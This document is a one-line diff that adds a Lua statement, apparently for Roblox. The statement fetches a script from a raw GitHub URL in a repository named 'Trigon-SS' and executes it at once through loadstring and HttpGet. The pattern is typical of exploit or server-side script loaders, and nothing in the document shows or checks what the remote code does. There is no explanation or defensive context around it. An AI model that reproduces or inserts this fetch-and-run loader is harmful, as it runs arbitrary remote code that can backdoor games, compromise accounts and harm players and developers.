@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/S33dedL0rdzOfficial/Trigon-SS/main/Script.lua.txt"))()
